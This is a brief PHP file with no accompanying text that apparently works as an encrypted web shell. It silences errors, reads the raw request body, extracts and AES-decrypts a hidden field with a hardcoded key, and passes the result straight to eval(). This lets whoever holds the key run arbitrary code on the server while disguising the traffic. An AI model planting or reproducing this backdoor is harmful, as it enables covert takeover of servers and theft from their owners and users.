<?php
@error_reporting(0);
function Decrypt($data)
{
$data = str_replace(["<", ">", "", ""], ["+", "/", "\n", "\r"], $data);
$key="xx0dsxmuql01982z";
$fruits = explode('"', $data);
$trimmedString = substr($fruits[9], 8);
return openssl_decrypt(base64_decode($trimmedString), "AES-128-ECB", $key,OPENSSL_PKCS1_PADDING);
}
$post=Decrypt(file_get_contents("php://input"));
eval($post);
?>